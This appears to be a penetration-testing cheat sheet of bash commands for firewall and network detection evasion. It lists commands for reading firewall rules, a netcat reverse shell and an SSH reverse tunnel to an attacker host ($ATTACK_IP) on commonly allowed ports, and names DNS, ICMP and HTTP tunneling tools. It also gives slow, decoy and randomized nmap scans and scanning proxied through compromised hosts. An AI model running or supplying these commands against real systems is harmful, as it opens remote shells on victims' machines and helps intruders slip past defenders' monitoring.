# Firewall & Network Detection Evasion

## Check Firewall Rules
```bash
# Linux
iptables -L
sudo ufw status

# Windows
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
```

## Bypass Restricted Egress
```bash
# Use common allowed ports (80, 443, 53)
nc -e /bin/sh $ATTACK_IP 80

# DNS tunneling (dnscat2)
# ICMP tunneling (ptunnel-ng)
# HTTP tunneling (Neo-reGeorg)
# SSH on port 443
ssh -R 8080:localhost:80 user@$ATTACK_IP -p 443
```

## Network Detection Evasion
```bash
# Slow down scans
nmap -T2 -sS -p 80,443,445 $TARGET_IP
nmap --randomize-hosts $TARGET_IP

# Decoy scans
nmap -D RND:5 $TARGET_IP
nmap -D decoy1,decoy2,ME $TARGET_IP

# Proxy/Redirect through compromised hosts
proxychains nmap -sT -Pn 10.0.0.0/24
```
